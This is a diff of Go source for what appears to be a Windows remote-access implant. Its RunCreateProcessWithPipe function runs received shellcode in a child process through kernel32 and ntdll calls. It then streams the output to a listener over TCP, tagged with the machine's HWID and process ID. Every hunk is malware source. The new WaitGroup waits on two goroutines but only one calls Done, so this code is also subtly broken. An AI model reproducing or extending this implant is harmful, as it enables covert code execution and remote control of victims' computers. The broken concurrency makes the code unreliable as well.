@@ -3,33 +3,34 @@ package HandlePacket
 import (
 	"encoding/binary"
 	"fmt"
+	"main/Helper"
 	"main/MessagePack"
 	"main/PcInfo"
 	"main/TCPsocket"
 	"net"
-	"runtime"
+	"sync"
 	"syscall"
 	"unsafe"
 
 	"golang.org/x/sys/windows"
 )
 
-func RunPE(unmsgpack MessagePack.MsgPack, Connection net.Conn) string {
-	var prog string
-	if runtime.GOARCH == "amd64" {
-		prog = unmsgpack.ForcePathObject("Process64").GetAsString()
-	} else {
-		prog = unmsgpack.ForcePathObject("Process86").GetAsString()
-	}
-	//fmt.Println(unmsgpack.ForcePathObject("args").GetAsString())
-	stdOut, stdErr := RunCreateProcessWithPipe(unmsgpack.ForcePathObject("Bin").GetAsBytes(), prog, "-w "+unmsgpack.ForcePathObject("args").GetAsString(), Connection)
-	if stdOut == "" {
-		return stdErr
-	}
-	return stdOut
-}
+// func RunPE(unmsgpack MessagePack.MsgPack, Connection *wsc.Wsc) string {
+// 	var prog string
+// 	if runtime.GOARCH == "amd64" {
+// 		prog = unmsgpack.ForcePathObject("Process64").GetAsString()
+// 	} else {
+// 		prog = unmsgpack.ForcePathObject("Process86").GetAsString()
+// 	}
+// 	//fmt.Println(unmsgpack.ForcePathObject("args").GetAsString())
+// 	stdOut, stdErr := RunCreateProcessWithPipe(unmsgpack.ForcePathObject("Bin").GetAsBytes(), prog, "-w "+unmsgpack.ForcePathObject("args").GetAsString(), Connection)
+// 	if stdOut == "" {
+// 		return stdErr
+// 	}
+// 	return stdOut
+// }
 
-func RunCreateProcessWithPipe(shellcode []byte, prog string, args string, Connection net.Conn) (stdOut, stdErr string) {
+func RunCreateProcessWithPipe(shellcode []byte, prog string, args string, conn net.Conn) (stdOut, stdErr string) {
 	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
 	ntdll := windows.NewLazySystemDLL("ntdll.dll")
 
@@ -492,7 +493,15 @@ func RunCreateProcessWithPipe(shellcode []byte, prog string, args string, Connec
 		stdErr = message
 		return
 	}
+
+	// 使用 sync.WaitGroup 来确保所有输出都被读取
+	var wg sync.WaitGroup
+	wg.Add(2) // 因为我们有两个 goroutine
+
+	outputChan := make(chan string)
+	// 实时读取 STDOUT
 	go func() {
+		defer wg.Done()
 		buffer := make([]byte, 1024)
 		for {
 			var bytesRead uint32
@@ -504,49 +513,32 @@ func RunCreateProcessWithPipe(shellcode []byte, prog string, args string, Connec
 				break
 			}
 			if bytesRead > 0 {
-
-				msgpack := new(MessagePack.MsgPack)
-				msgpack.ForcePathObject("Pac_ket").SetAsString("BackSession")
-				msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
-				msgpack.ForcePathObject("Domain").SetAsString("assembly")
-				msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
-				msgpack.ForcePathObject("ProcessIDClientHWID").SetAsString(PcInfo.GetProcessID() + PcInfo.GetHWID())
-				msgpack.ForcePathObject("ReadInput").SetAsString(string(buffer[:bytesRead]))
-				msgpack.ForcePathObject("HWID").SetAsString(PcInfo.GetHWID())
-				TCPsocket.Send(Connection, msgpack.Encode2Bytes())
-				//fmt.Printf("[STDOUT]: %s", string(buffer[:bytesRead]))
-
+				outputChan <- string(buffer[:bytesRead])
 			}
 		}
 	}()
-
-	// 实时读取 STDERR
+	// 统一处理输出的goroutine
 	go func() {
-		buffer := make([]byte, 1024)
-		for {
-			var bytesRead uint32
-			err := windows.ReadFile(stdErrRead, buffer, &bytesRead, nil)
+		for output := range outputChan {
+			utf8Stdout, err := Helper.ConvertGBKToUTF8(output)
 			if err != nil {
-				if err != windows.ERROR_BROKEN_PIPE {
-					fmt.Printf("Error reading from STDERR pipe: %v\n", err)
-				}
-				break
+				//Log(err.Error(), Connection, *unmsgpack)
+				utf8Stdout = err.Error()
 			}
-			if bytesRead > 0 {
-				msgpack := new(MessagePack.MsgPack)
-				msgpack.ForcePathObject("Pac_ket").SetAsString("BackSession")
-				msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
-				msgpack.ForcePathObject("Domain").SetAsString("assembly")
-				msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
-				msgpack.ForcePathObject("ProcessIDClientHWID").SetAsString(PcInfo.GetProcessID() + PcInfo.GetHWID())
-				msgpack.ForcePathObject("ReadInput").SetAsString(string(buffer[:bytesRead]))
-				msgpack.ForcePathObject("HWID").SetAsString(PcInfo.GetHWID())
-				TCPsocket.Send(Connection, msgpack.Encode2Bytes())
-			}
+			msgpack := new(MessagePack.MsgPack)
+			msgpack.ForcePathObject("Pac_ket").SetAsString("BackSession")
+			msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.ProcessID)
+			msgpack.ForcePathObject("Domain").SetAsString("assembly")
+			msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
+			msgpack.ForcePathObject("ProcessIDClientHWID").SetAsString(PcInfo.ProcessID + PcInfo.HWID)
+			msgpack.ForcePathObject("ReadInput").SetAsString(utf8Stdout)
+			msgpack.ForcePathObject("HWID").SetAsString(PcInfo.HWID)
+			TCPsocket.Send(conn, msgpack.Encode2Bytes())
+			windows.SleepEx(3, false)
 		}
 	}()
-
-	// 等待子进程结束
+	wg.Wait()
+	close(outputChan)
 	windows.WaitForSingleObject(procInfo.Process, windows.INFINITE)
 
 	// Close the handle to the child process
@@ -557,50 +549,15 @@ func RunCreateProcessWithPipe(shellcode []byte, prog string, args string, Connec
 		stdErr = message
 		return
 	}
-
-	// Close the hand to the child process thread
-
-	errCloseThreadHandle := windows.CloseHandle(procInfo.Thread)
-	if errCloseThreadHandle != nil {
-		message := fmt.Sprintf("Error closing the child process handle:\r\n\t%s", errCloseProcHandle.Error())
-		stdErr = message
-		return
-	}
-
-	// Close the write handle the anonymous STDOUT pipe
-	errCloseStdOutWrite := windows.CloseHandle(stdOutWrite)
-	if errCloseStdOutWrite != nil {
-		message := fmt.Sprintf("Error closing STDOUT pipe write handle:\r\n\t%s", errCloseStdOutWrite.Error())
-		stdErr = message
-		return
-	}
-
-	// Close the read handle to the anonymous STDIN pipe
-	errCloseStdInRead := windows.CloseHandle(stdInRead)
-	if errCloseStdInRead != nil {
-		message := fmt.Sprintf("Error closing the STDIN pipe read handle:\r\n\t%s", errCloseStdInRead.Error())
-		stdErr = message
-		return
-	}
-
-	// Close the write handle to the anonymous STDERR pipe
-	errCloseStdErrWrite := windows.CloseHandle(stdErrWrite)
-	if errCloseStdErrWrite != nil {
-		message := fmt.Sprintf("err closing STDERR pipe write handle:\r\n\t%s", errCloseStdErrWrite.Error())
-		stdErr = message
-		return
-	}
-
-	// Read STDOUT from child process
-	/*
-		BOOL ReadFile(
-		HANDLE       hFile,
-		LPVOID       lpBuffer,
-		DWORD        nNumberOfBytesToRead,
-		LPDWORD      lpNumberOfBytesRead,
-		LPOVERLAPPED lpOverlapped
-		);
-	*/
+	msgpack := new(MessagePack.MsgPack)
+	msgpack.ForcePathObject("Pac_ket").SetAsString("BackSession")
+	msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.ProcessID)
+	msgpack.ForcePathObject("Domain").SetAsString("")
+	msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
+	msgpack.ForcePathObject("ProcessIDClientHWID").SetAsString(PcInfo.ProcessID + PcInfo.HWID)
+	msgpack.ForcePathObject("ReadInput").SetAsString("")
+	msgpack.ForcePathObject("HWID").SetAsString(PcInfo.HWID)
+	TCPsocket.Send(conn, msgpack.Encode2Bytes())
 
 	return
 }
